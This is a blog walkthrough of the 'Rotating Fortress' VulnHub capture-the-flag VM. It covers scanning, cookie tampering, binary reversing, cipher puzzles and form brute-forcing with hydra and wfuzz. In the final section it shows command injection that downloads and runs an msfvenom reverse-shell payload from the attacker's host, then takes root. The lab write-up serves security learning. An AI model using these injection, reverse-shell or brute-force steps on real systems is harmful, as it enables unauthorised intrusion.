---
layout: post-detail
title: CTF rotating fortress
date: 2018-10-04
categories: CTF
description: CTF rotation fortress, iso -> https://www.vulnhub.com/entry/rotating-fortress-101,248/
img-url: ''
comments: true
---

# Iso

https://www.vulnhub.com/entry/rotating-fortress-101,248/

# Target

    $ nmap -sS 192.168.2.0/24

```txt
Nmap scan report for 192.168.2.53
Host is up (0.00082s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A7:B0:CB (Oracle VirtualBox virtual NIC)
```

    $ nmap -sT -sV -A -p- 192.168.2.53 

```txt
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
27025/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, GetRequest, HTTPOptions, Kerberos, NULL, RPCCheck, RTSPRequest:
|     Connection establised
|     Requesting Challenge Hash...
|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
|   DNSVersionBindReqTCP, GenericLines, SSLSessionReq:
|     Connection establised
|     Requesting Challenge Hash...
|   TLSSessionReq:
|     Connection establised
|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
|_    Requesting Challenge Hash...
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port27025-TCP:V=7.70%I=7%D=10/2%Time=5BB32398%P=x86_64-pc-linux-gnu%r(N
- - -
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
```

Web server on 80, 37025 database, ssh ? , and system debian linux

# Flag 1

Let's look the web server on `http://192.168.2.59`.

redirect to /Janus.php

```txt
You're not the Admin!
```

A look with burp-suite into Target\>Site map, Response\> Raw

```sh
HTTP/1.1 200 OK
Date: Tue, 02 Oct 2018 08:04:11 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: isAdmin=0
Vary: Accept-Encoding
Content-Length: 79
Connection: close
Content-Type: text/html; charset=UTF-8
```
Set-Cookie with isAdmin=0, Apache/2.4.25

On a web browser (chrome based), open the web debug (F12), go into Application\>Cookies\>http://192.168.2.53 and change the value isAdmin=1

Reload the page:

```txt
Welcome Back Admin Last edited file was: /LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html Flag: 1{7daLI]} ggez
```

# Flag 2

Go to http://192.168.2.53//LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html

We have a page with 3 links: Home | News | Wheel
+ `home` has a weird gif with a code: `66 71 76 66 61 62`
+ `news` has encrypted purposes
+ `wheel` print a beautiful message: `ACCESS_DENIED`. 

This new url have a /robots.txt.

```txt
User-agent: *
Disallow: /
Disallow: /icons/loki.bin
Disallow: /eris.php
```

    $ wget http://192.168.2.53//LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/icons/loki.bin
    $ file loki.bin

```txt
loki.bin: ELF 64-bit LSB shared object x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5ee04fe5ea96173af27612ff707628d8e684db16, not stripped
```
Open the file directly with vim show a password (on the line 19):

```txt
backd00r_pass123
```

    $ chmod +x loki.bin
    $ ./loki.bin
    Enter Password: backd00r_pass123

```txt
Did you really think it was going to be this easy? Nice try but no cigar ;)
access_denied
```

Lol, so... we must open a debugger at this point.

    $ gdb loki.bin
    disass main
    breakpoint strcmp@plt
    run
    Starting program loki.bin
    Enter Password: mysuperpassword
    Breakpoint 1, 0x0000555555554630 in strcmp@plt ()
    (gdb) i r $rdi
    rdi            0x7fffffffd890   140737488345232
    x/s 140737488345232
    0x7fffffffd890: "mysuperpassword"
    (gdb) nexti
    (gdb) i r $rsi
    rsi            0x555555756a49   93824994339401
    x/s 93824994339401
    0x555555756a49 <tmp>:   "xBspsiONMSNXeVuiomF"

The string "mysuperpassword" is compared to "xBspsiONMSNXeVuiomF". (I've passed 2 hour on this lol)

    $ ./loki.bin
    Enter Password: xBspsiONMSNXeVuiomF

```txt
access_granted!
Welcome back Loki
To do:
- Operation Smoke And Mirrors [X]
- Ask Zeus whats going on he's acting strange []
- Project FortNET [In Progress]
- Operation 679 [In Progress]
- Build a better decoder, just got to remember the rules: split '|', ++ ' ', // '.', Caesar cipher so letters are represented with numbers then shifted by the key which is displayed above each message []
- Operation Dual USB Assault [X]
- Update Security []
- Flag 2{tr09u2} What would happen if I just say...input 1000 A's?
```

# Flag 3

We have an indice for the page `/news.html`. The caesar cipher, i'll write the script in ruby.

    $ vim decrypt.rb

```ruby
#!/usr/bin/env ruby
# encoding: UTF-8

if ARGV.length != 1
  puts( "I need the code between tilde plz" )
  exit 1
end

trueMsg="#{ARGV[0]}"
trueMsgFilter=trueMsg.gsub( /[^0-9]/, '' )

# if found 3 numbers like in |117||107||
numF=/(\d{1})(\d{1})(\d{1})\|+/.match(trueMsg)
if numF
  new=trueMsgFilter.scan(/.../).map {|e| e.to_i }
else
  new=trueMsgFilter.scan(/../).map {|e| e.to_i }
end

strvoid=""
letterEncoded=""

# Find the max number of character from encoding, 256 here.
max=""
#2000000.times.reduce(0) do |x, i|
256.times.reduce(0) do |x, i|
  begin
    i.chr
    x += 1
  rescue
  end
  max=x
end
puts "max #{max} characters"

puts "**Crack caesar cipher ***************"
i = 1
# This first part just try with -100 to -1.
# if a letter is became < 0 with -X, they are subtract to the max 256 - X
(1..100).each do |n|
  new.each do |s|
    letterEncoded=s - i
    if letterEncoded < 0
      tempMax=max + letterEncoded
      letterEncoded=tempMax
    elsif letterEncoded == 0
      tempMax=max-1 + letterEncoded
      letterEncoded=tempMax
    end
    strvoid+=letterEncoded.chr
  end
  i+=1
  puts
  puts "Decoded -#{i} content : #{strvoid}"
  strvoid=""
end
i = 1
# this part try +1 to +100.
(1..100).each do |n|
  new.each do |s|
    letterEncoded=s + n
    strvoid+=letterEncoded.chr
  end
  puts
  puts "Decoded #{n} content : #{strvoid}"
  strvoid=""
end
puts "*************************************"
```

First message:

```txt
zeushereafteralongtimeofthinkingihavedecidedtoretirefromprojectrotatingfortresshoweveridonotwanttokilltheprojectwithmyretirementsoiampresentingyouallachallengeihavesetupapuzzleontheserverifyoucangetpastallpuzzlestheserverisyoursbythewayihaveremovedeverybodiesloginsfromtheserverexpectminesothiswontbeeasytakethisitmightbeuseful edvqyhwmfvqrducqjbzumysrwdgmfdht goodluck
```

The message contain a key `edvqyhwmfvqrducqjbzumysrwdgmfdht`.

Second:

```txt
wewillberestrictingaccesstotheserveruntilfurthernoticeforaneventanthena
```

Last message:
```txt
Decoded -4 content : zeushasaskedmetomakeanencoderforourupdatesthisismetestingitoutifitworksiwillbesendingittotherestofyouaswellasadecodertir
```

The site has a cookie `wheel_code`, past the key into value. It will redirect you at `/home.html` without the wheel.

At `/resources`, you will find a video `wheel.mp4` and `Harpocrates.gif`. You have to download the both.

    $ wget http://192.168.2.53/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/resources/wheel.mp4
    $ wget http://192.168.2.53/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/resources/Harpocrates.gif

The wheel.mp4 contain information for break the wheel and Harpocrates.gif, the code who have look before, let's try to break it :)

     ./decrypt.rb "|66||71||76||66||61||62|"
     Decoded 7 content : INSIDE
     Decoded 39 content : inside

The message `inside` from `Harpocrates.gif`. Let's lool with the command `strings`.

    $ strings Harpocrates.gif | tail

```txt
  <xmpDM:altTimecode
    xmpDM:timeValue="00:00:00:00"
    xmpDM:timeFormat="30Timecode"/>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>
<?xpacket end="r"?>
~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!
;Flag 3{~ATXVfzXk} he's the sneaky man [101] goto: /|117||107||126||104||109||108||105||117||123||114||125||117||122||117||105||112||114||104||123||104||121||108||108||118||122||126||107||114||108||123||103||121|/
the link will not work during isolation
```

# Flag 4

We have a new code to decrypt, a link.

    $ ./decrypt.rb "/|117||107||126||104||109||108||105||117||123||114||125||117||122||117||105||112||114||104||123||104||121||108||108||118||122||126||107||114||108||123||103||121|/"

```txt
Decoded -6 content : pfychgdpvmxpupdkmcvctggquyfmgvbt
```

Go to `http://192.168.2.53/pfychgdpvmxpupdkmcvctggquyfmgvbt/`


```txt
Access Denied
```

The page have a cookie `pass` with value 0, put the same key than the wheel_code.

```txt
You have come far but your journey is not over yet. ./Papa_Legba will guide you, good luck. Flag: decoded and ready to roll out, Flag 4{d#B=TVf5}
```

# Flag 5

New url to go: http://192.168.2.53/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/

We have a form with a password, and 2 buttons `download` and `submit`. First download.

    $ file papa_legba.zip
    papa_legba.zip: Zip archive data, at least v2.0 to extract
    $ 7z x papa_legba.zip
    
We got a `scramble.jpg` and `papa_legba.mp3`, an audio morse code :), hopefully, the web is full of stuff for decode this file: https://morsecode.scphillips.com/labs/audio-decoder-adaptive/.

The `scramble.jpg` contain a grid to create a password of 9 characters.

```txt
OWVSIUCFO
DZYWVOWHQ
BZGZOYUJB
AOWXKJBYU
FJSYVBEWC
LWJURYXQW
CMVYXQPJY
USNJVVUKC
KVPZTOVCX
```

The page Papa\_Legba have a comments into source code too:

```txt
<!-- n.t.s length is 9 -->
<!-- Loki here if you're reading this come to /pfychgdpvmxpupdkmcvctggquyfmgvbt/chat.php -->
```

I've first thing to use crunch to generate the dictionnary but 9^9=387420489 combinaisons possible will take too munch time.

Finally, after googling a bit, i've use a script in python, which use mainly `itertools`:

    $ vim pass-gen.py

```python
#!/usr/bin/env python

from sets import Set
from itertools import product

s1 = Set(['O','W','V','S','I','U','C','F','O'])
s2 = Set(['D','Z','Y','W','V','O','W','H','Q'])
s3 = Set(['B','Z','G','Z','O','Y','U','J','B'])
s4 = Set(['A','O','W','X','K','J','B','Y','U'])
s5 = Set(['F','J','S','Y','V','B','E','W','C'])
s6 = Set(['L','W','J','U','R','Y','X','Q','W'])
s7 = Set(['C','M','V','Y','X','Q','P','J','Y'])
s8 = Set(['U','S','N','J','V','V','U','K','C'])
s9 = Set(['K','V','P','Z','T','O','V','C','X'])

s1 -= s2
s2 -= s3
s3 -= s4
s4 -= s5
s5 -= s6
s6 -= s7
s7 -= s8
s8 -= s9
s9 -= s1

iterables = [ s1, s2, s3, s4, s5, s6, s7, s8, s9 ]

for t in product(*iterables):
  print (''.join(list(t)))
```

    $ python2.7 ./pass-gen.py > dict.txt

Only take 4 seconds to generate 840000 words.  
Next step is to bruteforce the password field.

    $ hydra -V -P dict.txt -l none -f 192.168.2.53 http-post-form '/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/index.php:password=^PASS^:reason='

Hydra fail to find the good password. So i've try wfuzz.

    $ wfuzz -w dict.txt -d "password=FUZZ" -t 100 --hh 803 http://192.168.2.53/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/index.php >log.txt

```txt
370871:  C=200     34 L	      87 W	    883 Ch	  " IHGAERMNT "
```

You have the result after more or less 1 hour. Once time you submit the password, the flag appear hidden in the source code :)

```txt
Flag 5{XOIQMZ} Hidden in plain sight, well done goto: /pfychgdpvmxpupdkmcvctggquyfmgvbt/xhyzwrwjrf/
```

# Flag 6

Click on the new message, a partition of music appear, again a code...

```txt
Mid, C = 39993
```
God i know nothing about this :), i googling a bit to discover wtf are the other notes.

[wikipedia](https://en.wikipedia.org/wiki/Musical_note) help me here.

Note name between french and english are totally different, i know `Do-Re-Mi-Fa-Sol-La-Si` but anyway: The mid C is a Mid Do :) 

We just compare and add +1 per 1/2 line:  
+ note 1 (+4): 39997
+ note 2 (+9): 40002
+ note 3 (+6): 39999
+ note 4 (+4): 39997
+ note 5 (+0): 39993
+ note 6 (+0): 39993

So, `39997`, `40002`, `39999`, `39993`, what this is can match?

A range port with nmap:

    $ nmap -sT -sV -p39993-40002 192.168.2.53

```txt
39993/tcp closed unknown
39994/tcp closed unknown
39995/tcp closed unknown
39996/tcp closed unknown
39997/tcp closed unknown
39998/tcp closed unknown
39999/tcp closed unknown
40000/tcp closed safetynetp
40001/tcp closed unknown
40002/tcp closed unknown
```
Something on the 40000 safetynetp

    $ nmap -n -v -Pn -p40000 -A --reason 192.168.2.53

During the scan work, we can connect with `nc`:

    $ nc 192.168.2.53 40000 -v

```txt
192.168.2.53: inverse host lookup failed:
(UNKNOWN) [192.168.2.53] 40000 (?) open
Connection establised
Please enter all the flags you have collected (not seperated, only data inside '{}'):
```

Time for regroup all flags:

Flag 1{7daLI]}
Flag 2{tr09u2}
Flag 3{~ATXVfzXk}
Flag 4{d#B=TVf5}
Flag 5{XOIQMZ}

7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZ

```txt
░▒▓ -= ZEUS' 1-WAY SHELL =- ▓▒░

```
Here i enter many commands, but nothing seem work :).

```sh
echo "DAWN!"
Did not execute command because it was dangerous/backlisted!
```
lol, so... We'll see if commands are really execute:

    $ touch useless.file
    $ python2.7 -m SimpleHTTPServer 4444

On Zeus:

    wget http://192.168.2.215:4444/useless.file
    $(wget http://192.168.2.215:4444/useless.file)

Yes! we have a response with the last command. Let's try to create a more usefull file like a reverse shell.

    $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.2.215 LPORT=1234 --platform linux -a x64 -f elf -o rev

On Zeus:

    $(wget -O /tmp/rev http://192.168.2.215:4444/rev)
    $(chmod +x /tmp/rev)

On your machine:

    $ nc -lnvp 1234

Zeus, exec the payload:

    $(/tmp/rev)

Change the shell by `/bin/bash` with a classic:

    python -c 'import pty;pty.spawn("/bin/bash")'
    
Find a flag file, there are always a flag... lol:

    find / 2>/dev/null | grep -i flag
    cat /home/www-data/deamon/Flag_6.txt

```txt
Flag 6 {r98yf53k<2x} Knock Knock...Who's There. It's me HACKERMAN!

login: zeus:ALL_FLAGS_COMBINED
```

# The end

The end comming soon we seem !

    $ su zeus
    7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZr98yf53k<2x

Yes, we are zeus. Check what we can do:

    sudo -l
    [sudo] password for zeus: 7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZr98yf53k<2x
    (ALL : ALL) ALL

Ok ok... relaunch the command to check flag file:

    find / 2>/dev/null | grep -i flag
    cat /flag.txt
    sudo cat /flag.txt

```txt
sudo cat /flag.txt
 _
/ \
\_/
| |  _____________________________________________________
|-|-|o                          /o\                       |
| | |                         //   \\                     |
| | |                       //       \\                   |
| | |                       o/       \o                   |
| | |                      | |       | |                  |
| | |                      | |   o   | |                  |
| | |                      | |       | |                  |
| | |                       o         o                   |
| | |                       \\       //                   |
| | |                         \\   //
|
| | |                           \o/                       |
| | | Congrats on gaining root!                           |
| | | ~ c0rruptedb1t                                      |
|-|-|o____________________________________________________|
| |
| |
| |
| |
| |
| |
| |
| |
| |
Thanks for playing!
```

Just whoaaa 4 days to finish this vm, caesar cipher, morse code, partition of music, many, many thing on this crazy vm :)
